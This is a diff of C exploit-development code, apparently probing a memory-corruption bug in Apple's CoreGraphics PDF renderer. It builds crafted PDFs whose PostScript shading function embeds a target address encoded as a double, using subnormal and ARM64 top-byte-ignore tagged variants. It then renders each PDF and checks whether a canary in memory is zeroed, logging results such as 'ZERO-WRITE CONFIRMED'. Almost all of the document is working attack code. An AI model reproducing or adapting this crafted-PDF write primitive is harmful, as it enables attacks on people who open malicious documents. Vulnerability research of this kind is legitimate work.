@@ -31865,153 +31865,201 @@ static void r508_7c_only(void) {
     rlog("\n  Best: NOUT=%d offset=0x%llx\n", best_nout,
         (unsigned long long)best_offset);
 
-    /* --- Canary test with TBI-tagged address as normal double --- */
+    /* --- Canary test: subnormal as PS literal + direct computation --- */
     static volatile uint32_t canary = 0xCAFEBABE;
     uint64_t canary_addr = (uint64_t)(uintptr_t)&canary;
     canary = 0xCAFEBABE;
 
-    /* TBI: set top byte so the 64-bit pattern is a NORMAL double (not subnormal).
-       ARM64 TBI ignores the top byte of addresses, so 0x40XXXXXXXXXXXX
-       accesses the same memory as 0x00XXXXXXXXXXXX.
-       0x4000000000000000 = 2.0 in IEEE 754 — we OR it with the address. */
-    uint64_t tbi_target = 0x4000000000000000ULL | (canary_addr & 0x00FFFFFFFFFFFFFFULL);
-    double tbi_dbl;
-    memcpy(&tbi_dbl, &tbi_target, 8);
-
     rlog("  canary at %p = 0x%08x\n", (void *)&canary, canary);
-    rlog("  TBI target: 0x%016llx (double=%.17g)\n",
-        (unsigned long long)tbi_target, tbi_dbl);
 
-    /* Verify: the double value should be close to 2.0 */
-    uint64_t verify_bits;
-    memcpy(&verify_bits, &tbi_dbl, 8);
-    rlog("  verify bits: 0x%016llx %s\n",
-        (unsigned long long)verify_bits,
-        verify_bits == tbi_target ? "OK" : "MISMATCH");
-
-    /* Build PostScript body: { pop <value> dup dup ... }
-       The value is a normal double (~2.0), not a subnormal, so PS won't flush it.
-       Range must be [0 4] to avoid clamping. */
+    /* The target address as a double is a subnormal (address < 2^52).
+       Try embedding it as a literal in PS and see if CG preserves it. */
+    double target_dbl;
+    memcpy(&target_dbl, &canary_addr, 8);
     char valbuf[64];
-    snprintf(valbuf, sizeof(valbuf), "%.20e", tbi_dbl);
-    rlog("  PS value: %s\n", valbuf);
-    fflush(stdout);
+    snprintf(valbuf, sizeof(valbuf), "%.20e", target_dbl);
+
+    /* Verify round-trip */
+    double rt;
+    sscanf(valbuf, "%le", &rt);
+    uint64_t rt_bits;
+    memcpy(&rt_bits, &rt, 8);
+    rlog("  addr=0x%016llx as double=%s\n",
+        (unsigned long long)canary_addr, valbuf);
+    rlog("  round-trip: 0x%016llx %s\n",
+        (unsigned long long)rt_bits,
+        rt_bits == canary_addr ? "OK" : "MISMATCH");
 
     int NOUT = best_nout;
-    int vblen = (int)strlen(valbuf);
-    char *fbody = (char *)malloc((size_t)(vblen + 16 + NOUT * 4));
-    int fbl = snprintf(fbody, (size_t)(vblen + 16), "{ pop %s", valbuf);
-    for (int d = 0; d < NOUT - 1; d++) {
-        memcpy(fbody + fbl, " dup", 4); fbl += 4;
-    }
-    fbody[fbl++] = ' '; fbody[fbl++] = '}'; fbody[fbl] = '\0';
 
-    rlog("  body len=%d\n", fbl);
-
-    /* Override Range to [0 4] so the ~2.0 value isn't clamped */
-    #define BUILD_WIDE_PDF(NOUT_VAL, fbody_str, label) do { \
-        const char *fb = fbody_str; \
-        int fblen = (int)strlen(fb); \
-        char *rpairs = (char *)malloc((size_t)(NOUT_VAL) * 4 + 4); \
-        int rpl = 0; \
-        for (int i = 0; i < (NOUT_VAL); i++) { \
-            if (i > 0) rpairs[rpl++] = ' '; \
-            rpairs[rpl++] = '0'; rpairs[rpl++] = ' '; rpairs[rpl++] = '4'; \
-        } \
-        rpairs[rpl] = '\0'; \
-        size_t cap = (size_t)(fblen + rpl + vo + 8192); \
-        char *p = (char *)malloc(cap); \
-        int pl = 0; \
-        pl += snprintf(p+pl, cap-(size_t)pl, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n"); \
-        int o1=pl; pl += snprintf(p+pl, cap-(size_t)pl, \
-            "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"); \
-        int o2=pl; pl += snprintf(p+pl, cap-(size_t)pl, \
-            "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"); \
-        int o3=pl; pl += snprintf(p+pl, cap-(size_t)pl, \
-            "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] " \
-            "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n"); \
-        const char *cstr = " /Sh1 sh\n"; \
-        int o4=pl; pl += snprintf(p+pl, cap-(size_t)pl, \
-            "4 0 obj\n<< /Length %d >>\nstream\n%s\nendstream\nendobj\n", \
-            (int)strlen(cstr), cstr); \
-        int o5=pl; pl += snprintf(p+pl, cap-(size_t)pl, \
-            "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK " \
-            "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d " \
-            "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>\nstream\n", \
-            VPR, vo); \
-        memcpy(p+pl, vstream, (size_t)vo); pl += vo; \
-        pl += snprintf(p+pl, cap-(size_t)pl, "\nendstream\nendobj\n"); \
-        int o6=pl; pl += snprintf(p+pl, cap-(size_t)pl, \
-            "6 0 obj\n<< /FunctionType 4 /Domain [0 1] /Range [%s] " \
-            "/Length %d >>\nstream\n%s\nendstream\nendobj\n", \
-            rpairs, fblen, fb); \
-        int xo=pl; pl += snprintf(p+pl, cap-(size_t)pl, \
-            "xref\n0 7\n0000000000 65535 f \n" \
-            "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n" \
-            "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n" \
-            "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n", \
-            o1, o2, o3, o4, o5, o6, xo); \
-        rlog("  %s: PDF %d bytes\n", label, pl); fflush(stdout); \
-        pdf_data = p; pdf_len = pl; \
-        free(rpairs); \
-    } while(0)
-
-    r508_fault_caught = 0;
-    r508_fault_addr = 0;
-    sigaction(SIGSEGV, &sa_new, &sa_old_segv);
-    sigaction(SIGBUS, &sa_new, &sa_old_bus);
-
-    if (sigsetjmp(r508_jmpbuf, 1) == 0) {
-        BUILD_WIDE_PDF(NOUT, fbody, "TBI canary");
-
-        CFDataRef pd = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)pdf_data, (CFIndex)pdf_len);
-        CGDataProviderRef dp = CGDataProviderCreateWithCFData(pd);
-        CGPDFDocumentRef dc = CGPDFDocumentCreateWithProvider(dp);
-        if (dc) {
-            CGPDFPageRef pg = CGPDFDocumentGetPage(dc, 1);
-            if (pg) {
-                CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                uint32_t *px = (uint32_t *)calloc(2 * 2, 4);
-                CGContextRef cx = CGBitmapContextCreate(px, 2, 2, 8, 2*4, cs,
-                    (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
-                rlog("  rendering...\n"); fflush(stdout);
-                CGContextDrawPDFPage(cx, pg);
-                rlog("  SURVIVED! canary=0x%08x (was 0xCAFEBABE)\n", canary);
-                if (canary == 0x00000000)
-                    rlog("  *** CANARY ZEROED! zero-write CONFIRMED via TBI! ***\n");
-                else if (canary != 0xCAFEBABE)
-                    rlog("  *** CANARY CHANGED to 0x%08x! ***\n", canary);
-                else
-                    rlog("  Canary unchanged — str didn't reach canary\n");
-                CGContextRelease(cx); CGColorSpaceRelease(cs); free(px);
-            }
-            CGPDFDocumentRelease(dc);
+    /* Approach A: literal subnormal in PS (might get flushed) */
+    rlog("\n  --- A: literal subnormal ---\n");
+    {
+        int vblen = (int)strlen(valbuf);
+        char *fbody = (char *)malloc((size_t)(vblen + 16 + NOUT * 4));
+        int fbl = snprintf(fbody, (size_t)(vblen + 16), "{ pop %s", valbuf);
+        for (int d = 0; d < NOUT - 1; d++) {
+            memcpy(fbody + fbl, " dup", 4); fbl += 4;
         }
-        CGDataProviderRelease(dp); CFRelease(pd);
-        free(pdf_data); pdf_data = NULL;
-    } else {
-        uint64_t far = r508_fault_addr;
-        rlog("  CRASH FAR=0x%016llx (canary=0x%08x)\n",
-            (unsigned long long)far, canary);
-        /* Check if FAR matches TBI target (with or without TBI stripping) */
-        uint64_t far_stripped = far & 0x00FFFFFFFFFFFFFFULL;
-        uint64_t canary_stripped = canary_addr & 0x00FFFFFFFFFFFFFFULL;
-        if (far_stripped == canary_stripped)
-            rlog("  *** FAR (stripped) = canary addr! TBI zero-write HIT! ***\n");
-        else if (far == tbi_target)
-            rlog("  *** FAR = TBI target exactly! ***\n");
-        else
-            rlog("  expected canary=0x%016llx, FAR delta=%lld\n",
-                (unsigned long long)canary_addr,
-                (long long)(far_stripped - canary_stripped));
-    }
-    sigaction(SIGSEGV, &sa_old_segv, NULL);
-    sigaction(SIGBUS, &sa_old_bus, NULL);
-    fflush(stdout);
+        fbody[fbl++] = ' '; fbody[fbl++] = '}'; fbody[fbl] = '\0';
 
-    free(vstream); free(fbody);
+        r508_fault_caught = 0; r508_fault_addr = 0;
+        sigaction(SIGSEGV, &sa_new, &sa_old_segv);
+        sigaction(SIGBUS, &sa_new, &sa_old_bus);
+        if (sigsetjmp(r508_jmpbuf, 1) == 0) {
+            BUILD_DUP_PDF(NOUT, fbody, "A literal");
+            CFDataRef pd = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)pdf_data, (CFIndex)pdf_len);
+            CGDataProviderRef dp = CGDataProviderCreateWithCFData(pd);
+            CGPDFDocumentRef dc = CGPDFDocumentCreateWithProvider(dp);
+            if (dc) {
+                CGPDFPageRef pg = CGPDFDocumentGetPage(dc, 1);
+                if (pg) {
+                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                    uint32_t *px = (uint32_t *)calloc(2*2, 4);
+                    CGContextRef cx = CGBitmapContextCreate(px, 2, 2, 8, 2*4, cs,
+                        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+                    CGContextDrawPDFPage(cx, pg);
+                    rlog("  A: SURVIVED canary=0x%08x\n", canary);
+                    CGContextRelease(cx); CGColorSpaceRelease(cs); free(px);
+                }
+                CGPDFDocumentRelease(dc);
+            }
+            CGDataProviderRelease(dp); CFRelease(pd);
+            free(pdf_data); pdf_data = NULL;
+        } else {
+            rlog("  A: CRASH FAR=0x%016llx canary=0x%08x\n",
+                (unsigned long long)r508_fault_addr, canary);
+            uint64_t far_low = r508_fault_addr & 0x00FFFFFFFFFFFFFFULL;
+            if (far_low == canary_addr)
+                rlog("  *** A: FAR matches canary! ***\n");
+        }
+        sigaction(SIGSEGV, &sa_old_segv, NULL);
+        sigaction(SIGBUS, &sa_old_bus, NULL);
+        fflush(stdout);
+        free(fbody);
+    }
+
+    /* Approach B: TBI tag with Range [0 1] (value > 1, will be clamped) */
+    rlog("\n  --- B: TBI 0x40 tag, Range [0 1] ---\n");
+    canary = 0xCAFEBABE;
+    {
+        uint64_t tbi_bits = 0x4000000000000000ULL | (canary_addr & 0x00FFFFFFFFFFFFFFULL);
+        double tbi_dbl;
+        memcpy(&tbi_dbl, &tbi_bits, 8);
+        char tbuf[64];
+        snprintf(tbuf, sizeof(tbuf), "%.20e", tbi_dbl);
+        rlog("  TBI value: %s (bits=0x%016llx)\n", tbuf, (unsigned long long)tbi_bits);
+
+        int tblen = (int)strlen(tbuf);
+        char *fbody = (char *)malloc((size_t)(tblen + 16 + NOUT * 4));
+        int fbl = snprintf(fbody, (size_t)(tblen + 16), "{ pop %s", tbuf);
+        for (int d = 0; d < NOUT - 1; d++) {
+            memcpy(fbody + fbl, " dup", 4); fbl += 4;
+        }
+        fbody[fbl++] = ' '; fbody[fbl++] = '}'; fbody[fbl] = '\0';
+
+        r508_fault_caught = 0; r508_fault_addr = 0;
+        sigaction(SIGSEGV, &sa_new, &sa_old_segv);
+        sigaction(SIGBUS, &sa_new, &sa_old_bus);
+        if (sigsetjmp(r508_jmpbuf, 1) == 0) {
+            BUILD_DUP_PDF(NOUT, fbody, "B TBI");
+            CFDataRef pd = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)pdf_data, (CFIndex)pdf_len);
+            CGDataProviderRef dp = CGDataProviderCreateWithCFData(pd);
+            CGPDFDocumentRef dc = CGPDFDocumentCreateWithProvider(dp);
+            if (dc) {
+                CGPDFPageRef pg = CGPDFDocumentGetPage(dc, 1);
+                if (pg) {
+                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                    uint32_t *px = (uint32_t *)calloc(2*2, 4);
+                    CGContextRef cx = CGBitmapContextCreate(px, 2, 2, 8, 2*4, cs,
+                        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+                    CGContextDrawPDFPage(cx, pg);
+                    rlog("  B: SURVIVED canary=0x%08x\n", canary);
+                    CGContextRelease(cx); CGColorSpaceRelease(cs); free(px);
+                }
+                CGPDFDocumentRelease(dc);
+            }
+            CGDataProviderRelease(dp); CFRelease(pd);
+            free(pdf_data); pdf_data = NULL;
+        } else {
+            rlog("  B: CRASH FAR=0x%016llx canary=0x%08x\n",
+                (unsigned long long)r508_fault_addr, canary);
+            uint64_t far_low = r508_fault_addr & 0x00FFFFFFFFFFFFFFULL;
+            if (far_low == canary_addr)
+                rlog("  *** B: FAR matches canary (TBI stripped)! ***\n");
+        }
+        sigaction(SIGSEGV, &sa_old_segv, NULL);
+        sigaction(SIGBUS, &sa_old_bus, NULL);
+        fflush(stdout);
+        free(fbody);
+    }
+
+    /* Approach C: TBI 0x3F tag — value just under 1.0, stays in [0,1] */
+    rlog("\n  --- C: TBI 0x3F tag (value < 1.0) ---\n");
+    canary = 0xCAFEBABE;
+    {
+        /* 0x3FXXXXXXXXXXXXXXX as a double is in [0.5, 1.0), which is in range [0,1] */
+        uint64_t tbi_bits = 0x3F00000000000000ULL | (canary_addr & 0x00FFFFFFFFFFFFFFULL);
+        double tbi_dbl;
+        memcpy(&tbi_dbl, &tbi_bits, 8);
+        char tbuf[64];
+        snprintf(tbuf, sizeof(tbuf), "%.20e", tbi_dbl);
+        rlog("  TBI 0x3F value: %s (bits=0x%016llx)\n", tbuf, (unsigned long long)tbi_bits);
+
+        /* Verify: is this in [0,1]? */
+        rlog("  as double: %.17g (in [0,1]? %s)\n", tbi_dbl,
+            (tbi_dbl >= 0.0 && tbi_dbl <= 1.0) ? "YES" : "NO");
+
+        int tblen = (int)strlen(tbuf);
+        char *fbody = (char *)malloc((size_t)(tblen + 16 + NOUT * 4));
+        int fbl = snprintf(fbody, (size_t)(tblen + 16), "{ pop %s", tbuf);
+        for (int d = 0; d < NOUT - 1; d++) {
+            memcpy(fbody + fbl, " dup", 4); fbl += 4;
+        }
+        fbody[fbl++] = ' '; fbody[fbl++] = '}'; fbody[fbl] = '\0';
+
+        r508_fault_caught = 0; r508_fault_addr = 0;
+        sigaction(SIGSEGV, &sa_new, &sa_old_segv);
+        sigaction(SIGBUS, &sa_new, &sa_old_bus);
+        if (sigsetjmp(r508_jmpbuf, 1) == 0) {
+            BUILD_DUP_PDF(NOUT, fbody, "C TBI-3F");
+            CFDataRef pd = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)pdf_data, (CFIndex)pdf_len);
+            CGDataProviderRef dp = CGDataProviderCreateWithCFData(pd);
+            CGPDFDocumentRef dc = CGPDFDocumentCreateWithProvider(dp);
+            if (dc) {
+                CGPDFPageRef pg = CGPDFDocumentGetPage(dc, 1);
+                if (pg) {
+                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                    uint32_t *px = (uint32_t *)calloc(2*2, 4);
+                    CGContextRef cx = CGBitmapContextCreate(px, 2, 2, 8, 2*4, cs,
+                        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+                    CGContextDrawPDFPage(cx, pg);
+                    rlog("  C: SURVIVED canary=0x%08x\n", canary);
+                    if (canary == 0x00000000)
+                        rlog("  *** CANARY ZEROED via TBI 0x3F! ***\n");
+                    else if (canary != 0xCAFEBABE)
+                        rlog("  *** CANARY CHANGED to 0x%08x! ***\n", canary);
+                    CGContextRelease(cx); CGColorSpaceRelease(cs); free(px);
+                }
+                CGPDFDocumentRelease(dc);
+            }
+            CGDataProviderRelease(dp); CFRelease(pd);
+            free(pdf_data); pdf_data = NULL;
+        } else {
+            rlog("  C: CRASH FAR=0x%016llx canary=0x%08x\n",
+                (unsigned long long)r508_fault_addr, canary);
+            uint64_t far_low = r508_fault_addr & 0x00FFFFFFFFFFFFFFULL;
+            if (far_low == canary_addr)
+                rlog("  *** C: TBI-stripped FAR = canary! ZERO-WRITE CONFIRMED! ***\n");
+        }
+        sigaction(SIGSEGV, &sa_old_segv, NULL);
+        sigaction(SIGBUS, &sa_old_bus, NULL);
+        fflush(stdout);
+        free(fbody);
+    }
+
+    free(vstream);
     #undef BUILD_DUP_PDF
-    #undef BUILD_WIDE_PDF
     rlog("\n=== r508_7c_only complete ===\n");
     fflush(stdout);
 }
